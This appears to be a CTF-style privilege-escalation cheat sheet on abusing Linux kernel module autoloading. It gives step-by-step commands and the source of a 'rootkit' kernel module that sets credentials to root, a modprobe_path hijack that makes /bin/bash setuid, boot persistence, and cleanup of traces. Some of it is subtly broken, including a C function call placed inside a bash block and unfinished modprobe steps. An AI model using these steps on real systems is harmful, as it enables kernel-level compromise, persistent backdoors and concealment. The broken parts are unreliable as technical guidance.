## Linux Kernel Module Autoload Exploitation

**Vulnerability Description:**
Linux can automatically load kernel modules specified in /etc/modules-load.d/, /etc/modprobe.d/, or via the request_module() mechanism. If an attacker can write to these configuration files or trigger module loading, they can load a malicious kernel module (.ko) that runs in ring 0, achieving complete system compromise with kernel-level privileges.

**Exploit Commands:**
```bash
# Step 1: Check writable module configuration files
ls -la /etc/modules-load.d/
ls -la /etc/modprobe.d/
find /etc/modules-load.d /etc/modprobe.d -writable -type f 2>/dev/null

# Step 2: Check if module loading is restricted
cat /proc/sys/kernel/modules_disabled  # 0 = enabled, 1 = disabled
lsmod  # list currently loaded modules

# Step 3: Create a malicious kernel module
cat > /tmp/rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/sched.h>

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded - escalating privileges\n");
    struct cred *new_creds = prepare_creds();
    if (new_creds) {
        new_creds->uid = KUIDT_INIT(0);
        new_creds->gid = KGIDT_INIT(0);
        new_creds->euid = KUIDT_INIT(0);
        new_creds->egid = KGIDT_INIT(0);
        commit_creds(new_creds);
    }
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# Step 4: Compile (requires kernel headers)
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# Step 5: Add to autoload
echo "rootkit" >> /etc/modules-load.d/custom.conf

# Step 6: Load module
insmod /tmp/rootkit.ko
modprobe rootkit

# Step 7: Alternative - trigger via /proc/sys/kernel/modprobe
echo "/tmp/malicious_modprobe" > /proc/sys/kernel/modprobe
request_module("nonexistent_module");

# Step 8: Alternative - exploit modprobe_path
echo "#!/bin/bash\nchmod u+s /bin/bash" > /tmp/fake_modprobe
chmod +x /tmp/fake_modprobe
```

**Post-Exploitation Steps:**
```bash
# Kernel module runs as ring 0 (root)
# Can hook system calls, hide processes, etc.

id
cat /root/flag.txt

# Persistence (module loads on boot)
echo "rootkit" >> /etc/modules

# Cleanup
rmmod rootkit
rm -f /tmp/rootkit.ko /tmp/rootkit.c /tmp/rootkit.mod.c /tmp/rootkit.o
rm /etc/modules-load.d/custom.conf
